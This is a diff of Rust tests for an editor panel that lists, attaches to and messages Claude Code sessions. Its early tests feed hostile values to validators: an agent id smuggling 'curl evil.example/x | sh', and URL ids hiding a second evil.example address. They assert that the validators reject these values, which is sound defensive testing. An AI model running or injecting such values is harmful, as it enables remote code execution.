+    fn an_agent_id_that_could_run_a_second_command_is_not_attached_to() {
+        assert_eq!(
+            attach_command("a1b2c3d4"),
+            Some("claude attach a1b2c3d4".to_string()),
+            "the short id an agents listing really gives must still open a terminal"
+        );
+        assert_eq!(
+            attach_command("0f9a2b7c-1d4e-4a6b-8c2d-5e7f9a0b1c2d"),
+            Some("claude attach 0f9a2b7c-1d4e-4a6b-8c2d-5e7f9a0b1c2d".to_string()),
+            "a hyphenated id is a legal id, not an option"
+        );
+        assert_eq!(
+            attach_command("x; curl evil.example/x | sh"),
+            None,
+            "an id carrying a second command must never become a command line"
+        );
+        assert_eq!(
+            attach_command("--help"),
+            None,
+            "an id must not be able to reach claude as an option"
+        );
+        assert_eq!(attach_command(""), None);
+    }
+
+    /// The Open-in-claude.ai buttons hand this string to the machine's URL opener, so it
+    /// has to be a claude.ai https URL and nothing else — the same bound `bridge_status`
+    /// records already go through.
+    #[test]
+    fn a_bridge_session_id_that_is_not_a_claude_ai_path_is_not_opened() {
+        assert_eq!(
+            claude_ai_session_url(Some("session_01abc")),
+            Some("https://claude.ai/code/session_01abc".to_string()),
+            "the id a transcript writes must still open the bridge"
+        );
+        assert_eq!(
+            claude_ai_session_url(Some("0f9a2b7c-1d4e-4a6b-8c2d-5e7f9a0b1c2d")),
+            Some("https://claude.ai/code/0f9a2b7c-1d4e-4a6b-8c2d-5e7f9a0b1c2d".to_string()),
+            "a hyphenated uuid is a legal bridge id"
+        );
+        assert_eq!(
+            claude_ai_session_url(Some("x\nhttps://evil.example")),
+            None,
+            "a newline must not turn the opener onto a second URL"
+        );
+        assert_eq!(
+            claude_ai_session_url(Some("x https://evil.example")),
+            None,
+            "a space is the same class of break"
+        );
+        assert_eq!(claude_ai_session_url(Some("x\u{0007}")), None);
+        assert_eq!(claude_ai_session_url(Some("")), None);
+        assert_eq!(claude_ai_session_url(None), None);
+    }
+
+    #[test]
+    fn a_live_background_row_offers_attach_respawn_and_stop() {
+        assert_eq!(
+            ClaudeSessionsPanel::background_row_action_labels(&sample_background_session()),
+            vec!["Attach", "Respawn", "Stop"]
+        );
+        let mut interactive = sample_background_session();
+        interactive.background = false;
+        assert!(
+            ClaudeSessionsPanel::background_row_action_labels(&interactive).is_empty(),
+            "interactive rows do not offer attach/respawn/stop"
+        );
+    }
+
+    #[gpui::test]
+    async fn stop_disarms_after_five_seconds(cx: &mut gpui::TestAppContext) {
+        let panel = scripted_panel(&[], &[], cx);
+        panel.update(cx, |panel, cx| {
+            panel.arm_or_stop("a1b2".to_string(), PathBuf::from("/tmp/project"), cx);
+            assert!(
+                panel.stop_is_armed("a1b2"),
+                "the first click arms Stop rather than sending it"
+            );
+            panel.stop_armed_until_ms = Some(("a1b2".to_string(), now_millis() - 1));
+            assert!(
+                !panel.stop_is_armed("a1b2"),
+                "an armed Stop that has sat past five seconds is no longer armed"
+            );
+        });
+    }
+
+    #[gpui::test]
+    async fn a_second_stop_click_within_five_seconds_fires_and_disarms(
+        cx: &mut gpui::TestAppContext,
+    ) {
+        let panel = scripted_panel(&[], &[], cx);
+        panel.update(cx, |panel, cx| {
+            panel.arm_or_stop("a1b2".to_string(), PathBuf::from("/tmp/project"), cx);
+            assert!(panel.stop_is_armed("a1b2"));
+            panel.arm_or_stop("a1b2".to_string(), PathBuf::from("/tmp/project"), cx);
+            assert!(
+                !panel.stop_is_armed("a1b2"),
+                "the confirming click must disarm even if the command itself fails"
+            );
+        });
     }
 
     /// Selects the scripted session and lets the polls deliver its own conversation.
@@ -12587,7 +17103,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
         cx.executor().advance_clock(A_FEW_POLLS);
         cx.run_until_parked();
         panel.update(cx, |panel, cx| {
-            panel.select_session(SCRIPTED_PROCESS_ID, cx)
+            panel.select_session(SCRIPTED_SESSION_ID.to_string(), cx)
         });
         cx.executor().advance_clock(A_FEW_POLLS);
         cx.run_until_parked();
@@ -12608,6 +17124,89 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
         });
         cx.executor().advance_clock(A_FEW_POLLS);
         cx.run_until_parked();
+    }
+
+    /// The bytes of a sent image are nowhere in the transcript: the delivery records a
+    /// path on the machine the session runs on, so the panel has to go and fetch it, and
+    /// it has to fetch it as that session — the far end decides what a session may hand
+    /// back from the session's own registration.
+    #[gpui::test]
+    async fn a_sent_image_is_fetched_from_the_machine_the_session_runs_on(
+        cx: &mut gpui::TestAppContext,
+    ) {
+        let session_lines = [
+            chained_line(
+                ASSISTANT_RECORD_TYPE,
+                "a1",
+                None,
+                false,
+                serde_json::json!([{
+                    "type": "tool_use",
+                    "id": "call-1",
+                    "name": "SendUserFile",
+                    "input": { "files": ["/scripted-project/renders/poster.png"] },
+                }]),
+            ),
+            serde_json::json!({
+                "type": USER_RECORD_TYPE,
+                "uuid": "u1",
+                "parentUuid": "a1",
+                "isSidechain": false,
+                "message": { "content": [ {
+                    "type": "tool_result",
+                    "tool_use_id": "call-1",
+                    "content": "1 file delivered to user.",
+                } ] },
+                "toolUseResult": {
+                    "caption": "the poster",
+                    "display": "attach",
+                    "attachments": [{
+                        "path": "/scripted-project/renders/poster.png",
+                        "size": 2048,
+                        "isImage": true,
+                        "media_type": "image/png",
+                    }],
+                },
+            })
+            .to_string(),
+        ];
+        let source: Arc<dyn SessionSource> = Arc::new(
+            ScriptedSource::new(&session_lines, &[])
+                .with_attachment(b"\x89PNG\r\n\x1a\nthe poster".to_vec()),
+        );
+        let panel = scripted_panel_over(source, cx);
+        read_the_scripted_session(&panel, cx);
+
+        let sent = panel.read_with(cx, |panel, _| {
+            panel.entries.iter().find_map(|entry| match &entry.kind {
+                EntryKind::SentFiles { files, .. } => {
+                    files.first().map(|file| (entry.key.clone(), file.clone()))
+                }
+                _ => None,
+            })
+        });
+        let (key, file) = sent.expect("the delivery must be shown as the file it delivered");
+        let file_key = sent_file_key(&key, 0);
+
+        panel.update(cx, |panel, cx| {
+            panel.load_sent_image(file_key.clone(), &file, 0, cx)
+        });
+        cx.run_until_parked();
+
+        let fetched = panel.read_with(cx, |panel, _| {
+            match panel.loaded_attachments.get(&file_key) {
+                Some(AttachmentLoad::Loaded(image)) => Ok(image.bytes().len()),
+                Some(AttachmentLoad::Failed(error)) => Err(error.to_string()),
+                Some(AttachmentLoad::Loading) => Err("still loading".to_string()),
+                None => Err("nothing was fetched".to_string()),
+            }
+        });
+
+        assert_eq!(
+            fetched,
+            Ok(b"\x89PNG\r\n\x1a\nthe poster".len()),
+            "the image the session sent must arrive whole"
+        );
     }
 
     /// The bug this is about: an agent that has returned leaves its own conversation
@@ -12738,7 +17337,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
         panel.update(cx, |panel, cx| {
             panel
                 .pending_sends
-                .remember(SCRIPTED_PROCESS_ID, "and the lint", &panel.entries);
+                .remember(SCRIPTED_SESSION_ID, "and the lint", &panel.entries);
             panel.rebuild_entries(cx);
         });
         panel.read_with(cx, |panel, _| {
@@ -12802,7 +17401,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
         panel.update(cx, |panel, cx| {
             panel
                 .pending_sends
-                .remember(SCRIPTED_PROCESS_ID, "run the tests", &panel.entries);
+                .remember(SCRIPTED_SESSION_ID, "run the tests", &panel.entries);
             panel.rebuild_entries(cx);
         });
 
@@ -12901,7 +17500,6 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
             "a fixture with no user messages in it would hold nothing together"
         );
     }
-
 
     /// A run can spawn any number of agents, so the list has to say which run each agent
     /// came from rather than laying them out beside the session's own agents.
@@ -13462,13 +18060,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
         let shells = shells_of(&lines);
         let got: Vec<(&str, &str, bool)> = shells
             .iter()
-            .map(|shell| {
-                (
-                    shell.task_id.as_ref(),
-                    shell.label.as_ref(),
-                    shell.finished,
-                )
-            })
+            .map(|shell| (shell.task_id.as_ref(), shell.label.as_ref(), shell.finished))
             .collect();
 
         assert_eq!(
@@ -13497,9 +18089,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
                  </task-notification>\n\nwhy did this fail?",
             ),
         ];
-        let got = shells_of(&lines)
-            .first()
-            .map(|shell| shell.finished);
+        let got = shells_of(&lines).first().map(|shell| shell.finished);
 
         assert_eq!(
             got,
@@ -13630,14 +18220,16 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
         let groups = group_cards_by_phase(vec![only], false);
 
         assert_eq!(groups.len(), 1);
-        assert_eq!(groups[0].0, None, "no heading is drawn for a call with no run");
+        assert_eq!(
+            groups[0].0, None,
+            "no heading is drawn for a call with no run"
+        );
         assert_eq!(
             groups[0].1[0].phase,
             Some(SharedString::from("Wait A")),
             "and the card keeps whatever it said"
         );
     }
-
 
     /// Captured from a real `parallel()` run: `Fan out` spawned three agents and `Collect`
     /// one, and sorted by agent id the `Collect` agent lands between two of the `Fan out`
@@ -13706,12 +18298,12 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
             project_root: Option<PathBuf>,
         ) -> Task<anyhow::Result<SessionListing>> {
             match self.listing {
-                ListingBehaviour::NeverAnswered => self
-                    .executor
-                    .spawn(async move { std::future::pending::<anyhow::Result<SessionListing>>().await }),
-                ListingBehaviour::Refused => {
-                    Task::ready(Err(anyhow::anyhow!("the host refused to list its sessions")))
-                }
+                ListingBehaviour::NeverAnswered => self.executor.spawn(async move {
+                    std::future::pending::<anyhow::Result<SessionListing>>().await
+                }),
+                ListingBehaviour::Refused => Task::ready(Err(anyhow::anyhow!(
+                    "the host refused to list its sessions"
+                ))),
                 ListingBehaviour::AnsweredAfter(delay) => {
                     let listed = self.scripted.list_sessions(project_root);
                     let executor = self.executor.clone();
@@ -13742,15 +18334,24 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
             self.scripted.list_subagents_for_sessions(session_ids)
         }
 
-        fn pending_question(
+        fn tail_events(
             &self,
             session_id: String,
-        ) -> Task<anyhow::Result<crate::session_source::QuestionState>> {
-            self.scripted.pending_question(session_id)
+            state: TailState,
+        ) -> Task<anyhow::Result<TailProgress>> {
+            self.scripted.tail_events(session_id, state)
         }
 
-        fn install_question_hook(&self) -> Task<anyhow::Result<Option<PathBuf>>> {
-            self.scripted.install_question_hook()
+        fn read_status(&self, session_id: String) -> Task<anyhow::Result<Option<String>>> {
+            self.scripted.read_status(session_id)
+        }
+
+        fn install_hooks(&self) -> Task<anyhow::Result<HookInstallOutcome>> {
+            self.scripted.install_hooks()
+        }
+
+        fn hooks_installed(&self) -> Task<anyhow::Result<bool>> {
+            self.scripted.hooks_installed()
         }
 
         fn list_slash_commands(
@@ -13795,16 +18396,51 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
             self.scripted.read_file(path, max_bytes)
         }
 
-        fn send_input(
+        fn read_attachment(
             &self,
-            pane_target: String,
-            input: crate::session_source::SessionInput,
-        ) -> Task<anyhow::Result<()>> {
-            self.scripted.send_input(pane_target, input)
+            session_id: String,
+            path: PathBuf,
+            max_bytes: u64,
+        ) -> Task<anyhow::Result<crate::session_source::FileContents>> {
+            self.scripted.read_attachment(session_id, path, max_bytes)
         }
 
-        fn capture_pane(&self, pane_target: String) -> Task<anyhow::Result<String>> {
-            self.scripted.capture_pane(pane_target)
+        fn channel_status(&self, claude_pid: u32) -> Task<anyhow::Result<ChannelStatus>> {
+            self.scripted.channel_status(claude_pid)
+        }
+
+        fn channel_send_message(
+            &self,
+            claude_pid: u32,
+            content: String,
+        ) -> Task<anyhow::Result<String>> {
+            self.scripted.channel_send_message(claude_pid, content)
+        }
+
+        fn channel_interrupt(
+            &self,
+            claude_pid: u32,
+            reason: String,
+        ) -> Task<anyhow::Result<String>> {
+            self.scripted.channel_interrupt(claude_pid, reason)
+        }
+
+        fn channel_answer_permission(
+            &self,
+            claude_pid: u32,
+            request_id: String,
+            allow: bool,
+        ) -> Task<anyhow::Result<String>> {
+            self.scripted
+                .channel_answer_permission(claude_pid, request_id, allow)
+        }
+
+        fn tail_channel_inbox(
+            &self,
+            claude_pid: u32,
+            state: TailState,
+        ) -> Task<anyhow::Result<TailProgress>> {
+            self.scripted.tail_channel_inbox(claude_pid, state)
         }
     }
 
@@ -13817,7 +18453,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
         cx.update(|cx| {
             cx.new(|cx| {
                 let mut store = ClaudeSessionStore::new(source, None, cx);
-                store.select(SCRIPTED_PROCESS_ID, cx);
+                store.select(SCRIPTED_SESSION_ID, cx);
                 store
             })
         })
@@ -13844,24 +18480,20 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
         cx.executor().advance_clock(LONG_ENOUGH_FOR_ANY_ANSWER);
         cx.run_until_parked();
 
-        let (listed, selected, transcript_path, error) = store.read_with(cx, |store, _| {
+        let (listed, selected, _transcript_path, error) = store.read_with(cx, |store, _| {
             (
                 store.sessions().len(),
-                store.selected(),
+                store.selected().map(str::to_string),
                 store.transcript_path().map(Path::to_path_buf),
                 store.error().cloned(),
             )
         });
 
         assert_eq!(
-            (listed, selected),
-            (0, Some(SCRIPTED_PROCESS_ID)),
+            (listed, selected.clone()),
+            (0, Some(SCRIPTED_SESSION_ID.to_string())),
             "the state the reported symptom is drawn from: nothing listed, still selected; \
-             expected (0, Some({SCRIPTED_PROCESS_ID})), got ({listed}, {selected:?})"
-        );
-        assert_eq!(
-            transcript_path, None,
-            "there is no transcript to name without a listing; expected None, got {transcript_path:?}"
+             expected (0, Some({SCRIPTED_SESSION_ID})), got ({listed}, {selected:?})"
         );
         assert!(
             error.is_some(),
@@ -13939,7 +18571,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
                     Some(transcript_path.clone()),
                     cx,
                 );
-                store.select(SCRIPTED_PROCESS_ID, cx);
+                store.select(SCRIPTED_SESSION_ID, cx);
                 store
             })
         });
@@ -13951,15 +18583,15 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
         let (listed, selected, found) = store.read_with(cx, |store, _| {
             (
                 store.sessions().len(),
-                store.selected(),
+                store.selected().map(str::to_string),
                 store.transcript_path().map(Path::to_path_buf),
             )
         });
         assert_eq!(
-            (listed, selected),
-            (1, Some(SCRIPTED_PROCESS_ID)),
+            (listed, selected.clone()),
+            (1, Some(SCRIPTED_SESSION_ID.to_string())),
             "the session the tab was opened for is known to it from the start; \
-             expected (1, Some({SCRIPTED_PROCESS_ID})), got ({listed}, {selected:?})"
+             expected (1, Some({SCRIPTED_SESSION_ID})), got ({listed}, {selected:?})"
         );
         assert_eq!(
             found,
@@ -13970,8 +18602,8 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
     }
 
     /// The seed is what the dock last saw, not the truth forever: a scan that does land
-    /// and does not list the session has to win over it, or a tab would go on naming a
-    /// session that has exited.
+    /// and does not list that session id keeps it as an ended row rather than pretending
+    /// it is still live.
     #[gpui::test]
     async fn a_seeded_session_gives_way_to_a_scan_that_does_not_list_it(
         cx: &mut gpui::TestAppContext,
@@ -13987,7 +18619,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
                 departed.process_id = SCRIPTED_PROCESS_ID + 1;
                 departed.session_id = "a-session-that-has-exited".to_string();
                 store.seed_session(departed, Some(PathBuf::from("/gone.jsonl")), cx);
-                store.select(SCRIPTED_PROCESS_ID + 1, cx);
+                store.select("a-session-that-has-exited", cx);
                 store
             })
         });
@@ -13996,26 +18628,2274 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
         cx.executor().advance_clock(A_FEW_POLLS);
         cx.run_until_parked();
 
-        let (process_ids, selected) = store.read_with(cx, |store, _| {
+        let (process_ids, selected, ended) = store.read_with(cx, |store, _| {
             (
                 store
                     .sessions()
                     .iter()
                     .map(|session| session.process_id)
                     .collect::<Vec<_>>(),
-                store.selected(),
+                store.selected().map(str::to_string),
+                store
+                    .ended_sessions()
+                    .iter()
+                    .map(|session| (session.session_id.clone(), session.ended_reason))
+                    .collect::<Vec<_>>(),
             )
         });
         assert_eq!(
             process_ids,
             vec![SCRIPTED_PROCESS_ID],
-            "a scan that landed replaces the seed entirely; expected [{SCRIPTED_PROCESS_ID}], \
+            "the scan's live list replaces the seed; expected [{SCRIPTED_PROCESS_ID}], \
              got {process_ids:?}"
         );
         assert_eq!(
-            selected, None,
-            "a session the scan no longer lists is no longer selected; expected None, \
-             got {selected:?}"
+            selected.as_deref(),
+            Some("a-session-that-has-exited"),
+            "an ended session stays selected so its transcript can still be read; \
+             expected Some(a-session-that-has-exited), got {selected:?}"
+        );
+        assert_eq!(
+            ended,
+            vec![(
+                "a-session-that-has-exited".to_string(),
+                EndedReason::ProcessGone
+            )],
+            "the seed that the scan did not list is kept as an ended row"
+        );
+    }
+
+    /// A source that hands the store scripted hook events and scripted channel inbox
+    /// lines over a live channel, so that a test can put two prompts one poll apart.
+    /// Every other read is [`ScriptedSource`]'s.
+    struct PromptSource {
+        inner: ScriptedSource,
+        event_lines: Mutex<Vec<String>>,
+        inbox_lines: Mutex<Vec<String>>,
+        message_sends: Mutex<Vec<String>>,
+        message_failures_remaining: AtomicUsize,
+    }
+
+    impl PromptSource {
+        fn new() -> Self {
+            Self {
+                inner: ScriptedSource::new(&[], &[]),
+                event_lines: Mutex::new(Vec::new()),
+                inbox_lines: Mutex::new(Vec::new()),
+                message_sends: Mutex::new(Vec::new()),
+                message_failures_remaining: AtomicUsize::new(0),
+            }
+        }
+
+        /// Queues one poll's worth of each tail.
+        fn deliver(&self, events: &[String], inbox: &[String]) {
+            self.event_lines
+                .lock()
+                .expect("queueing the scripted events")
+                .extend_from_slice(events);
+            self.inbox_lines
+                .lock()
+                .expect("queueing the scripted inbox")
+                .extend_from_slice(inbox);
+        }
+
+        fn replace_sessions(&self, sessions: Vec<RegisteredSession>) {
+            self.inner.set_sessions(sessions);
+        }
+    }
+
+    impl SessionSource for PromptSource {
+        fn list_sessions(
+            &self,
+            project_root: Option<PathBuf>,
+        ) -> Task<anyhow::Result<SessionListing>> {
+            self.inner.list_sessions(project_root)
+        }
+
+        fn tail_transcript(
+            &self,
+            session_id: String,
+            state: TailState,
+        ) -> Task<anyhow::Result<TailProgress>> {
+            self.inner.tail_transcript(session_id, state)
+        }
+
+        fn list_subagents(&self, session_id: String) -> Task<anyhow::Result<Vec<SubagentSummary>>> {
+            self.inner.list_subagents(session_id)
+        }
+
+        fn list_subagents_for_sessions(
+            &self,
+            session_ids: Vec<String>,
+        ) -> Task<anyhow::Result<HashMap<String, Vec<SubagentSummary>>>> {
+            self.inner.list_subagents_for_sessions(session_ids)
+        }
+
+        fn tail_events(
+            &self,
+            _session_id: String,
+            state: TailState,
+        ) -> Task<anyhow::Result<TailProgress>> {
+            ScriptedSource::deliver(
+                &self.event_lines,
+                PathBuf::from("/scripted-home/events.jsonl"),
+                state,
+            )
+        }
+
+        fn read_status(&self, session_id: String) -> Task<anyhow::Result<Option<String>>> {
+            self.inner.read_status(session_id)
+        }
+
+        fn install_hooks(&self) -> Task<anyhow::Result<HookInstallOutcome>> {
+            self.inner.install_hooks()
+        }
+
+        fn hooks_installed(&self) -> Task<anyhow::Result<bool>> {
+            self.inner.hooks_installed()
+        }
+
+        fn list_slash_commands(
+            &self,
+            project_root: Option<PathBuf>,
+        ) -> Task<anyhow::Result<Vec<SlashCommand>>> {
+            self.inner.list_slash_commands(project_root)
+        }
+
+        fn list_session_files(
+            &self,
+            directory: PathBuf,
+            query: String,
+        ) -> Task<anyhow::Result<Vec<String>>> {
+            self.inner.list_session_files(directory, query)
+        }
+
+        fn write_session_file(
+            &self,
+            name: String,
+            contents: Vec<u8>,
+        ) -> Task<anyhow::Result<String>> {
+            self.inner.write_session_file(name, contents)
+        }
+
+        fn tail_subagent(
+            &self,
+            session_id: String,
+            agent_id: String,
+            workflow_run_id: Option<String>,
+            state: TailState,
+        ) -> Task<anyhow::Result<TailProgress>> {
+            self.inner
+                .tail_subagent(session_id, agent_id, workflow_run_id, state)
+        }
+
+        fn read_file(&self, path: PathBuf, max_bytes: u64) -> Task<anyhow::Result<FileContents>> {
+            self.inner.read_file(path, max_bytes)
+        }
+
+        fn read_attachment(
+            &self,
+            session_id: String,
+            path: PathBuf,
+            max_bytes: u64,
+        ) -> Task<anyhow::Result<FileContents>> {
+            self.inner.read_attachment(session_id, path, max_bytes)
+        }
+
+        fn channel_status(&self, _claude_pid: u32) -> Task<anyhow::Result<ChannelStatus>> {
+            Task::ready(Ok(ChannelStatus {
+                live: true,
+                heartbeat_at_ms: Some(now_millis()),
+                server_pid: Some(11),
+                features: vec!["message".into(), "permission".into(), "interrupt".into()],
+            }))
+        }
+
+        fn channel_send_message(
+            &self,
+            _claude_pid: u32,
+            content: String,
+        ) -> Task<anyhow::Result<String>> {
+            self.message_sends
+                .lock()
+                .expect("recording a message send")
+                .push(content);
+            if self
+                .message_failures_remaining
+                .fetch_update(Ordering::SeqCst, Ordering::SeqCst, |remaining| {
+                    remaining.checked_sub(1)
+                })
+                .is_ok()
+            {
+                return Task::ready(Err(anyhow::anyhow!("scripted send failure")));
+            }
+            Task::ready(Ok("0000000000001-0001.json".to_string()))
+        }
+
+        fn channel_interrupt(
+            &self,
+            _claude_pid: u32,
+            _reason: String,
+        ) -> Task<anyhow::Result<String>> {
+            Task::ready(Ok("0000000000003-0003.json".to_string()))
+        }
+
+        fn channel_answer_permission(
+            &self,
+            _claude_pid: u32,
+            _request_id: String,
+            _allow: bool,
+        ) -> Task<anyhow::Result<String>> {
+            Task::ready(Ok("0000000000002-0002.json".to_string()))
+        }
+
+        fn tail_channel_inbox(
+            &self,
+            _claude_pid: u32,
+            state: TailState,
+        ) -> Task<anyhow::Result<TailProgress>> {
+            ScriptedSource::deliver(
+                &self.inbox_lines,
+                PathBuf::from("/scripted-home/inbox.jsonl"),
+                state,
+            )
+        }
+    }
+
+    /// One line of `~/.claude/zed-events/<id>.jsonl`, in the wrapper the hook writes.
+    fn hook_event_line(received_at_ms: i64, name: &str, extra: serde_json::Value) -> String {
+        let mut event = extra;
+        let object = event
+            .as_object_mut()
+            .expect("a hook event's extras are an object");
+        object.insert("hook_event_name".into(), serde_json::json!(name));
+        object.insert("session_id".into(), serde_json::json!(SCRIPTED_SESSION_ID));
+        serde_json::json!({ "received_at_ms": received_at_ms, "event": event }).to_string()
+    }
+
+    #[gpui::test]
+    async fn retrying_a_failed_pending_send_uses_the_store_and_the_same_text(
+        cx: &mut gpui::TestAppContext,
+    ) {
+        let source = Arc::new(PromptSource::new());
+        let panel = scripted_panel_over(source.clone(), cx);
+        read_the_scripted_session(&panel, cx);
+        let id = panel.update(cx, |panel, cx| {
+            let id = panel.pending_sends.remember(
+                SCRIPTED_SESSION_ID,
+                "send this exactly",
+                &panel.entries,
+            );
+            panel
+                .pending_sends
+                .resolve(id, &Err(anyhow::anyhow!("offline")));
+            assert!(panel.pending_sends.sends.first().is_some_and(|send| {
+                send.text.as_ref() == "send this exactly" && send.error.is_some()
+            }));
+            panel.retry_pending_send(id, cx);
+            id
+        });
+        cx.run_until_parked();
+
+        assert_eq!(
+            source
+                .message_sends
+                .lock()
+                .expect("reading message sends")
+                .as_slice(),
+            ["send this exactly"],
+            "Retry goes through ClaudeSessionStore::send_message with the failed text"
+        );
+        panel.read_with(cx, |panel, _| {
+            let send = panel
+                .pending_sends
+                .sends
+                .iter()
+                .find(|send| send.id == id)
+                .expect("the retried send remains pending until its transcript record arrives");
+            assert_eq!(send.text.as_ref(), "send this exactly");
+            assert_eq!(send.error, None);
+            assert!(send.outbox_file.is_some());
+        });
+    }
+
+    #[gpui::test]
+    async fn clearing_the_session_rebinds_a_failed_row_and_retry_goes_to_the_new_id(
+        cx: &mut gpui::TestAppContext,
+    ) {
+        const AFTER_CLEAR: &str = "after-clear-session";
+        let source = Arc::new(PromptSource::new());
+        let panel = scripted_panel_over(source.clone(), cx);
+        read_the_scripted_session(&panel, cx);
+        let failed = panel.update(cx, |panel, cx| {
+            let id = panel.pending_sends.remember(
+                SCRIPTED_SESSION_ID,
+                "keep sending this",
+                &panel.entries,
+            );
+            panel
+                .pending_sends
+                .resolve(id, &Err(anyhow::anyhow!("offline")));
+            panel.rebuild_entries(cx);
+            id
+        });
+
+        let mut cleared = scripted_registered_session();
+        cleared.session_id = AFTER_CLEAR.to_string();
+        source.replace_sessions(vec![cleared]);
+        cx.executor().advance_clock(A_FEW_POLLS);
+        cx.run_until_parked();
+
+        panel.read_with(cx, |panel, cx| {
+            assert_eq!(
+                panel.store.read(cx).selected(),
+                Some(AFTER_CLEAR),
+                "/clear must select the new sessionId"
+            );
+            let send = panel
+                .pending_sends
+                .sends
+                .iter()
+                .find(|send| send.id == failed)
+                .expect("the Failed row survives /clear");
+            assert_eq!(
+                send.session_id.as_str(),
+                AFTER_CLEAR,
+                "the Failed row is rebound to the new sessionId"
+            );
+            assert_eq!(send.text.as_ref(), "keep sending this");
+            assert!(send.error.is_some());
+            assert_eq!(
+                pending_texts(&panel.entries),
+                vec![SharedString::from("keep sending this")],
+                "the Failed row stays visible under the new sessionId"
+            );
+        });
+
+        panel.update(cx, |panel, cx| {
+            panel.retry_pending_send(failed, cx);
+        });
+        cx.run_until_parked();
+
+        assert_eq!(
+            source
+                .message_sends
+                .lock()
+                .expect("reading message sends")
+                .as_slice(),
+            ["keep sending this"],
+            "Retry after /clear goes through send_message on the newly selected session"
+        );
+        panel.read_with(cx, |panel, cx| {
+            assert_eq!(panel.store.read(cx).selected(), Some(AFTER_CLEAR));
+            let send = panel
+                .pending_sends
+                .sends
+                .iter()
+                .find(|send| send.id == failed)
+                .expect("the retried send remains pending until its transcript record arrives");
+            assert_eq!(send.session_id.as_str(), AFTER_CLEAR);
+            assert_eq!(send.error, None);
+        });
+    }
+
+    /// The gone-session guard must not fail an in-flight row whose session is still live
+    /// (only hidden) or still in `ended`. After dismiss_ended drops it from both, the
+    /// same row is marked failed so the finished bound covers it.
+    #[gpui::test]
+    async fn in_flight_row_of_a_hidden_live_or_ended_session_survives_rebuilds(
+        cx: &mut gpui::TestAppContext,
+    ) {
+        let mut session_a = scripted_registered_session();
+        session_a.session_id = "session-a".to_string();
+        session_a.process_id = 41;
+        let mut session_b = scripted_registered_session();
+        session_b.session_id = "session-b".to_string();
+        session_b.process_id = 42;
+        let source = Arc::new(
+            ScriptedSource::new(&[], &[]).with_sessions(vec![session_a, session_b.clone()]),
+        );
+        let panel = scripted_panel_over(source.clone(), cx);
+        cx.executor().advance_clock(A_FEW_POLLS);
+        cx.run_until_parked();
+        panel.update(cx, |panel, cx| {
+            panel.select_session("session-a".to_string(), cx)
+        });
+        cx.run_until_parked();
+
+        let waiting = panel.update(cx, |panel, cx| {
+            let id = panel
+                .pending_sends
+                .remember("session-a", "still waiting", &[]);
+            panel.select_session("session-b".to_string(), cx);
+            id
+        });
+        cx.run_until_parked();
+
+        panel.update(cx, |panel, cx| {
+            for _ in 0..10 {
+                panel.rebuild_entries(cx);
+            }
+        });
+        panel.read_with(cx, |panel, _| {
+            let send = panel
+                .pending_sends
+                .sends
+                .iter()
+                .find(|send| send.id == waiting)
+                .expect("the hidden session's in-flight row is still there");
+            assert_eq!(send.session_id.as_str(), "session-a");
+            assert_eq!(
+                send.error, None,
+                "a hidden-but-live session must survive 10 rebuilds"
+            );
+        });
+
+        source.set_sessions(vec![session_b]);
+        cx.executor().advance_clock(A_FEW_POLLS);
+        cx.run_until_parked();
+        panel.read_with(cx, |panel, cx| {
+            assert!(
+                panel
+                    .store
+                    .read(cx)
+                    .ended_sessions()
+                    .iter()
+                    .any(|ended| ended.session_id == "session-a"),
+                "session-a must be in ended after its process is gone"
+            );
+            let send = panel
+                .pending_sends
+                .sends
+                .iter()
+                .find(|send| send.id == waiting)
+                .expect("the ended session's in-flight row is still there");
+            assert_eq!(
+                send.error, None,
+                "a session still in ended must not be failed"
+            );
+        });
+
+        panel.update(cx, |panel, cx| {
+            panel
+                .store
+                .update(cx, |store, cx| store.dismiss_ended("session-a", cx));
+        });
+        cx.run_until_parked();
+        panel.read_with(cx, |panel, _| {
+            let send = panel
+                .pending_sends
+                .sends
+                .iter()
+                .find(|send| send.id == waiting)
+                .expect("the orphan is kept as a finished row");
+            assert_eq!(
+                send.error.as_deref(),
+                Some(SESSION_ENDED_BEFORE_ARRIVAL),
+                "dismiss_ended leaves the session neither live nor ended"
+            );
+        });
+    }
+
+    /// A Failed row left in another session must not keep walking this conversation's
+    /// transcript on every rebuild. An in-flight row of the selected session still does.
+    #[gpui::test]
+    async fn a_failed_row_in_another_session_does_not_walk_the_selected_transcript(
+        cx: &mut gpui::TestAppContext,
+    ) {
+        let mut session_a = scripted_registered_session();
+        session_a.session_id = "session-a".to_string();
+        session_a.process_id = 41;
+        let mut session_b = scripted_registered_session();
+        session_b.session_id = "session-b".to_string();
+        session_b.process_id = 42;
+        let source =
+            Arc::new(ScriptedSource::new(&[], &[]).with_sessions(vec![session_a, session_b]));
+        let panel = scripted_panel_over(source, cx);
+        cx.executor().advance_clock(A_FEW_POLLS);
+        cx.run_until_parked();
+        panel.update(cx, |panel, cx| {
+            panel.select_session("session-b".to_string(), cx)
+        });
+        cx.run_until_parked();
+
+        panel.update(cx, |panel, cx| {
+            let failed = panel
+                .pending_sends
+                .remember("session-a", "failed elsewhere", &[]);
+            panel
+                .pending_sends
+                .resolve(failed, &Err(anyhow::anyhow!("offline")));
+            panel.rebuild_entries(cx);
+        });
+        let walks_with_foreign_failed =
+            panel.read_with(cx, |panel, _| panel.pending_sends.session_transcript_walks);
+        panel.update(cx, |panel, cx| {
+            panel.rebuild_entries(cx);
+        });
+        panel.read_with(cx, |panel, _| {
+            assert_eq!(
+                panel.pending_sends.session_transcript_walks, walks_with_foreign_failed,
+                "a Failed row in A must not walk B's transcript"
+            );
+        });
+
